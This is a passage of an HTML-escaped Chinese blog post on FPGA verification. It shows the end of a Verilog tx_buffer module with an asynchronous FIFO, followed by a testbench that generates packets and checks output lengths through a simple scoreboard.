&lt;span&gt;143&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (rst_n==&lt;span&gt;0&lt;/span&gt;) &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;144&lt;/span&gt;         rst_cnt &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; 
&lt;/span&gt;&lt;span&gt;145&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;146&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(add_rst_cnt) &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;147&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt;&lt;span&gt;(end_rst_cnt)
&lt;/span&gt;&lt;span&gt;148&lt;/span&gt;             rst_cnt &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; 
&lt;/span&gt;&lt;span&gt;149&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;150&lt;/span&gt;             rst_cnt &amp;lt;= rst_cnt+&lt;span&gt;1&lt;/span&gt;&lt;span&gt; ;
&lt;/span&gt;&lt;span&gt;151&lt;/span&gt;    &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;152&lt;/span&gt; &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;153&lt;/span&gt; &lt;span&gt;assign&lt;/span&gt; add_rst_cnt =&lt;span&gt; (rst_flag);
&lt;/span&gt;&lt;span&gt;154&lt;/span&gt; &lt;span&gt;assign&lt;/span&gt; end_rst_cnt = add_rst_cnt  &amp;amp;&amp;amp; rst_cnt == (&lt;span&gt;3&lt;/span&gt;)-&lt;span&gt;1&lt;/span&gt;&lt;span&gt; ;
&lt;/span&gt;&lt;span&gt;155&lt;/span&gt; 
&lt;span&gt;156&lt;/span&gt; 
&lt;span&gt;157&lt;/span&gt; 
&lt;span&gt;158&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;FIFO位宽32bit 一帧数据最长1514byte，即379个16bit数据
&lt;/span&gt;&lt;span&gt;159&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;FIFO深度：379*4 = 1516  需要2048
&lt;/span&gt;&lt;span&gt;160&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;异步FIFO例化&lt;/span&gt;
&lt;span&gt;161&lt;/span&gt; &lt;span&gt;    fifo_generator_0 fifo (
&lt;/span&gt;&lt;span&gt;162&lt;/span&gt;   .rst(rst),        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; input wire rst&lt;/span&gt;
&lt;span&gt;163&lt;/span&gt;   .wr_clk(user_clk),  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; input wire wr_clk   100MHZ&lt;/span&gt;
&lt;span&gt;164&lt;/span&gt;   .rd_clk(eth_tx_clk),  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; input wire rd_clk  125MHZ&lt;/span&gt;
&lt;span&gt;165&lt;/span&gt;   .din(fifo_din),        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; input wire [33 : 0] din&lt;/span&gt;
&lt;span&gt;166&lt;/span&gt;   .wr_en(wr_en),    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; input wire wr_en&lt;/span&gt;
&lt;span&gt;167&lt;/span&gt;   .rd_en(rd_en),    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; input wire rd_en&lt;/span&gt;
&lt;span&gt;168&lt;/span&gt;   .dout(fifo_dout),      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; output wire [33 : 0] dout&lt;/span&gt;
&lt;span&gt;169&lt;/span&gt;   .full(full),      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; output wire full&lt;/span&gt;
&lt;span&gt;170&lt;/span&gt;   .empty(empty),    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; output wire empty&lt;/span&gt;
&lt;span&gt;171&lt;/span&gt;   .wr_data_count(wr_data_count)  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; output wire [11 : 0] wr_data_count&lt;/span&gt;
&lt;span&gt;172&lt;/span&gt; &lt;span&gt;);
&lt;/span&gt;&lt;span&gt;173&lt;/span&gt; 
&lt;span&gt;174&lt;/span&gt; &lt;span&gt;endmodule&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;tx_buffer&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;span&gt;接下来是验证部分，也就是本文的重点。以下的testbench包含了最基本的测试思想：发送测试激励给UUT，将UUT输出与黄金参考值进行比较，通过记分牌输出比较结果。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;&lt;img id=&quot;code_img_closed_83f6e29e-7c61-43ff-8c3f-a16ecc2c79fc&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_83f6e29e-7c61-43ff-8c3f-a16ecc2c79fc&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_83f6e29e-7c61-43ff-8c3f-a16ecc2c79fc&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;91&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  1&lt;/span&gt; `timescale 1ns /&lt;span&gt; 1ps
&lt;/span&gt;&lt;span&gt;  2&lt;/span&gt; 
&lt;span&gt;  3&lt;/span&gt; &lt;span&gt;module&lt;/span&gt;&lt;span&gt; tx_buffer_tb( );
&lt;/span&gt;&lt;span&gt;  4&lt;/span&gt; 
&lt;span&gt;  5&lt;/span&gt; &lt;span&gt;parameter&lt;/span&gt; USER_CLK_CYC = &lt;span&gt;10&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;  6&lt;/span&gt;           ETH_CLK_CYC = &lt;span&gt;8&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;  7&lt;/span&gt;           RST_TIM = &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;  8&lt;/span&gt;           
&lt;span&gt;  9&lt;/span&gt; &lt;span&gt;parameter&lt;/span&gt; SIM_TIM =&lt;span&gt; 10_000;
&lt;/span&gt;&lt;span&gt; 10&lt;/span&gt; 
&lt;span&gt; 11&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt;&lt;span&gt; user_clk;
&lt;/span&gt;&lt;span&gt; 12&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt;&lt;span&gt; rst_n;
&lt;/span&gt;&lt;span&gt; 13&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt; [&lt;span&gt;32&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;] din;
&lt;/span&gt;&lt;span&gt; 14&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt;&lt;span&gt; din_vld,din_sop,din_eop;
&lt;/span&gt;&lt;span&gt; 15&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt; [&lt;span&gt;2&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;] din_mod;
&lt;/span&gt;&lt;span&gt; 16&lt;/span&gt; &lt;span&gt;wire&lt;/span&gt;&lt;span&gt; rdy;
&lt;/span&gt;&lt;span&gt; 17&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt;&lt;span&gt; eth_tx_clk;
&lt;/span&gt;&lt;span&gt; 18&lt;/span&gt; &lt;span&gt;wire&lt;/span&gt; [&lt;span&gt;8&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;] dout;
&lt;/span&gt;&lt;span&gt; 19&lt;/span&gt; &lt;span&gt;wire&lt;/span&gt;&lt;span&gt; dout_sop,dout_eop,dout_vld;
&lt;/span&gt;&lt;span&gt; 20&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt; [&lt;span&gt;8&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;] dout_buf [&lt;span&gt;0&lt;/span&gt;:&lt;span&gt;1024&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt; 21&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt; [&lt;span&gt;16&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;] len [&lt;span&gt;0&lt;/span&gt;:&lt;span&gt;100&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt; 22&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt; [&lt;span&gt;2&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;] mod [&lt;span&gt;0&lt;/span&gt;:&lt;span&gt;100&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt; 23&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt; err_flag = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 24&lt;/span&gt; 
&lt;span&gt; 25&lt;/span&gt; tx_buffer#(.DATA_W(&lt;span&gt;32&lt;/span&gt;))&lt;span&gt;//&lt;/span&gt;&lt;span&gt;位宽不能改动&lt;/span&gt;
&lt;span&gt; 26&lt;/span&gt; &lt;span&gt;dut
&lt;/span&gt;&lt;span&gt; 27&lt;/span&gt; &lt;span&gt;(
&lt;/span&gt;&lt;span&gt; 28&lt;/span&gt;     
&lt;span&gt; 29&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;全局信号&lt;/span&gt;
&lt;span&gt; 30&lt;/span&gt;    .rst_n      (rst_n) ,&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保证拉低三个时钟周期，否则FIF可能不会正确复位&lt;/span&gt;
&lt;span&gt; 31&lt;/span&gt; &lt;span&gt;   .user_clk   (user_clk) ,
&lt;/span&gt;&lt;span&gt; 32&lt;/span&gt; &lt;span&gt;   .din        (din) ,
&lt;/span&gt;&lt;span&gt; 33&lt;/span&gt; &lt;span&gt;   .din_vld    (din_vld) ,
&lt;/span&gt;&lt;span&gt; 34&lt;/span&gt; &lt;span&gt;   .din_sop    (din_sop) ,
&lt;/span&gt;&lt;span&gt; 35&lt;/span&gt; &lt;span&gt;   .din_eop    (din_eop) ,
&lt;/span&gt;&lt;span&gt; 36&lt;/span&gt; &lt;span&gt;   .din_mod    (din_mod) ,
&lt;/span&gt;&lt;span&gt; 37&lt;/span&gt; &lt;span&gt;   .rdy        (rdy) ,
&lt;/span&gt;&lt;span&gt; 38&lt;/span&gt; &lt;span&gt;   .eth_tx_clk (eth_tx_clk) ,
&lt;/span&gt;&lt;span&gt; 39&lt;/span&gt; &lt;span&gt;   .dout       (dout) ,
&lt;/span&gt;&lt;span&gt; 40&lt;/span&gt; &lt;span&gt;   .dout_sop   (dout_sop) ,
&lt;/span&gt;&lt;span&gt; 41&lt;/span&gt; &lt;span&gt;   .dout_eop   (dout_eop) ,
&lt;/span&gt;&lt;span&gt; 42&lt;/span&gt; &lt;span&gt;   .dout_vld   (dout_vld) 
&lt;/span&gt;&lt;span&gt; 43&lt;/span&gt; &lt;span&gt;    );
&lt;/span&gt;&lt;span&gt; 44&lt;/span&gt;     
&lt;span&gt; 45&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************时钟*****************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 46&lt;/span&gt;     &lt;span&gt;initial&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 47&lt;/span&gt;         user_clk = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 48&lt;/span&gt;         &lt;span&gt;forever&lt;/span&gt; #(USER_CLK_CYC/&lt;span&gt;2&lt;/span&gt;) user_clk = ~&lt;span&gt;user_clk;
&lt;/span&gt;&lt;span&gt; 49&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 50&lt;/span&gt; 
&lt;span&gt; 51&lt;/span&gt;     &lt;span&gt;initial&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 52&lt;/span&gt;         eth_tx_clk = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 53&lt;/span&gt;         &lt;span&gt;forever&lt;/span&gt; #(ETH_CLK_CYC/&lt;span&gt;2&lt;/span&gt;) eth_tx_clk = ~&lt;span&gt;eth_tx_clk;
&lt;/span&gt;&lt;span&gt; 54&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 55&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************复位逻辑*****************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 56&lt;/span&gt;     &lt;span&gt;initial&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 57&lt;/span&gt;         rst_n = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 58&lt;/span&gt;         #&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 59&lt;/span&gt;         rst_n = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 60&lt;/span&gt;         #(RST_TIM*&lt;span&gt;USER_CLK_CYC);
&lt;/span&gt;&lt;span&gt; 61&lt;/span&gt;         rst_n = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 62&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 63&lt;/span&gt;     
&lt;span&gt; 64&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************输入激励*****************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 65&lt;/span&gt; &lt;span&gt;integer&lt;/span&gt; gen_time = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 66&lt;/span&gt;     &lt;span&gt;initial&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 67&lt;/span&gt;         #&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 68&lt;/span&gt; &lt;span&gt;        packet_initial;
&lt;/span&gt;&lt;span&gt; 69&lt;/span&gt;         #(RST_TIM*&lt;span&gt;USER_CLK_CYC);
&lt;/span&gt;&lt;span&gt; 70&lt;/span&gt;         packet_gen(&lt;span&gt;20&lt;/span&gt;,&lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 71&lt;/span&gt;         #(USER_CLK_CYC*&lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 72&lt;/span&gt;         packet_gen(&lt;span&gt;30&lt;/span&gt;,&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 73&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 74&lt;/span&gt;     
&lt;span&gt; 75&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************输出缓存与检测*****************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;    
&lt;span&gt; 76&lt;/span&gt; &lt;span&gt;integer&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 77&lt;/span&gt; &lt;span&gt;integer&lt;/span&gt; chk_time = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 78&lt;/span&gt;     &lt;span&gt;initial&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 79&lt;/span&gt;         &lt;span&gt;forever&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 80&lt;/span&gt;             @(&lt;span&gt;posedge&lt;/span&gt;&lt;span&gt; eth_tx_clk)
&lt;/span&gt;&lt;span&gt; 81&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt;(dout_vld)&lt;span&gt;begin&lt;/span&gt;    
&lt;span&gt; 82&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt;(dout_sop)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 83&lt;/span&gt;                     dout_buf[&lt;span&gt;0&lt;/span&gt;] =&lt;span&gt; dout;
&lt;/span&gt;&lt;span&gt; 84&lt;/span&gt;                     j = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 85&lt;/span&gt;                 &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 86&lt;/span&gt;                 &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(dout_eop)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 87&lt;/span&gt;                     dout_buf[j] =&lt;span&gt; dout;
&lt;/span&gt;&lt;span&gt; 88&lt;/span&gt;                     j = j+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 89&lt;/span&gt; &lt;span&gt;                    packet_check;
&lt;/span&gt;&lt;span&gt; 90&lt;/span&gt;                 &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 91&lt;/span&gt;                 &lt;span&gt;else&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 92&lt;/span&gt;                     dout_buf[j] =&lt;span&gt; dout;
&lt;/span&gt;&lt;span&gt; 93&lt;/span&gt;                     j = j+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 94&lt;/span&gt;                 &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 95&lt;/span&gt;             &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 96&lt;/span&gt;         &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 97&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 98&lt;/span&gt;     
&lt;span&gt; 99&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************score board*****************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;100&lt;/span&gt; &lt;span&gt;integer&lt;/span&gt;&lt;span&gt; fid;
&lt;/span&gt;&lt;span&gt;101&lt;/span&gt;     &lt;span&gt;initial&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;102&lt;/span&gt;         fid = $fopen(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;test.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;103&lt;/span&gt;         $fdisplay(fid,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;                 Start testing                      \n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;104&lt;/span&gt; &lt;span&gt;        #SIM_TIM;
&lt;/span&gt;&lt;span&gt;105&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt;&lt;span&gt;(err_flag)
&lt;/span&gt;&lt;span&gt;106&lt;/span&gt;             $fdisplay(fid,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Check is failed\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;107&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;108&lt;/span&gt;             $fdisplay(fid,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Check is successful\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;109&lt;/span&gt;         $fdisplay(fid,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;                 Testing is finished                \n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;110&lt;/span&gt; &lt;span&gt;        $fclose(fid);
&lt;/span&gt;&lt;span&gt;111&lt;/span&gt; &lt;span&gt;        $stop;
&lt;/span&gt;&lt;span&gt;112&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;113&lt;/span&gt; 
&lt;span&gt;114&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************子任务*****************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;    
&lt;span&gt;115&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;包生成子任务&lt;/span&gt;
&lt;span&gt;116&lt;/span&gt;     &lt;span&gt;task&lt;/span&gt;&lt;span&gt; packet_gen;
&lt;/span&gt;&lt;span&gt;117&lt;/span&gt;         &lt;span&gt;input&lt;/span&gt; [&lt;span&gt;16&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;] length;
&lt;/span&gt;&lt;span&gt;118&lt;/span&gt;         &lt;span&gt;input&lt;/span&gt; [&lt;span&gt;2&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;] invalid_byte;
&lt;/span&gt;&lt;span&gt;119&lt;/span&gt;         &lt;span&gt;integer&lt;/span&gt;&lt;span&gt; i;
&lt;/span&gt;&lt;span&gt;120&lt;/span&gt;         &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;121&lt;/span&gt;             len[gen_time] =&lt;span&gt; length;
&lt;/span&gt;&lt;span&gt;122&lt;/span&gt;             mod[gen_time] =&lt;span&gt; invalid_byte;
&lt;/span&gt;&lt;span&gt;123&lt;/span&gt;             
&lt;span&gt;124&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt;(i = &lt;span&gt;1&lt;/span&gt;;i&amp;lt;=length;i=i+&lt;span&gt;1&lt;/span&gt;)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;125&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt;(rdy == &lt;span&gt;1&lt;/span&gt;)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;126&lt;/span&gt;                     din_vld = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;127&lt;/span&gt;                     &lt;span&gt;if&lt;/span&gt;(i==&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;128&lt;/span&gt;                         din_sop = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;129&lt;/span&gt;                     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(i == length)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;130&lt;/span&gt;                         din_eop = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;131&lt;/span&gt;                         din_mod =&lt;span&gt; invalid_byte;
&lt;/span&gt;&lt;span&gt;132&lt;/span&gt;                     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;133&lt;/span&gt;                     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;134&lt;/span&gt;                         din_sop = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;135&lt;/span&gt;                         din_eop = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;136&lt;/span&gt;                         din_mod = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;137&lt;/span&gt;                     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;138&lt;/span&gt;                     din =&lt;span&gt; i ;
&lt;/span&gt;&lt;span&gt;139&lt;/span&gt;                 &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;140&lt;/span&gt;                 
&lt;span&gt;141&lt;/span&gt;                 &lt;span&gt;else&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;142&lt;/span&gt;                     din_sop =&lt;span&gt; din_sop;
&lt;/span&gt;&lt;span&gt;143&lt;/span&gt;                     din_eop =&lt;span&gt; din_eop;
&lt;/span&gt;&lt;span&gt;144&lt;/span&gt;                     din_vld = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;145&lt;/span&gt;                     din_mod =&lt;span&gt; din_mod;
&lt;/span&gt;&lt;span&gt;146&lt;/span&gt;                     din =&lt;span&gt; din;
&lt;/span&gt;&lt;span&gt;147&lt;/span&gt;                     i = i - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;148&lt;/span&gt;                 &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;149&lt;/span&gt;                 
&lt;span&gt;150&lt;/span&gt;                 #(USER_CLK_CYC*&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;151&lt;/span&gt;             &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;152&lt;/span&gt; &lt;span&gt;            packet_initial;
&lt;/span&gt;&lt;span&gt;153&lt;/span&gt;             gen_time = gen_time + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;154&lt;/span&gt;         &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;155&lt;/span&gt; &lt;span&gt;    endtask
&lt;/span&gt;&lt;span&gt;156&lt;/span&gt;     
&lt;span&gt;157&lt;/span&gt;     &lt;span&gt;task&lt;/span&gt;&lt;span&gt; packet_initial;
&lt;/span&gt;&lt;span&gt;158&lt;/span&gt;         &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;159&lt;/span&gt;             din_sop = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;160&lt;/span&gt;             din_eop = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;161&lt;/span&gt;             din_vld = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;162&lt;/span&gt;             din = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;163&lt;/span&gt;             din_mod = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;164&lt;/span&gt;         &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;165&lt;/span&gt; &lt;span&gt;    endtask
&lt;/span&gt;&lt;span&gt;166&lt;/span&gt; 
&lt;span&gt;167&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;包检测子任务&lt;/span&gt;
&lt;span&gt;168&lt;/span&gt;     &lt;span&gt;task&lt;/span&gt;&lt;span&gt; packet_check;
&lt;/span&gt;&lt;span&gt;169&lt;/span&gt;         &lt;span&gt;integer&lt;/span&gt;&lt;span&gt; k;
&lt;/span&gt;&lt;span&gt;170&lt;/span&gt;         &lt;span&gt;integer&lt;/span&gt;&lt;span&gt; num,packet_len;
&lt;/span&gt;&lt;span&gt;171&lt;/span&gt;         &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;172&lt;/span&gt;             num = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;173&lt;/span&gt;             $fdisplay(fid,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%dth:Packet checking...\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,chk_time);
&lt;/span&gt;&lt;span&gt;174&lt;/span&gt;             packet_len = &lt;span&gt;4&lt;/span&gt;*len[chk_time]-&lt;span&gt;mod[chk_time];
&lt;/span&gt;&lt;span&gt;175&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt;(j != packet_len)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;176&lt;/span&gt;                 $fdisplay(fid,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Length of the packet is wrong.\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;177&lt;/span&gt;                 err_flag = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;178&lt;/span&gt;                 &lt;span&gt;disable&lt;/span&gt;&lt;span&gt; packet_check;
&lt;/span&gt;&lt;span&gt;179&lt;/span&gt;             &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;180&lt;/span&gt;             
&lt;span&gt;181&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt;(k=&lt;span&gt;0&lt;/span&gt;;k&amp;lt;packet_len;k=k+&lt;span&gt;1&lt;/span&gt;)&lt;span&gt;begin&lt;/span&gt;
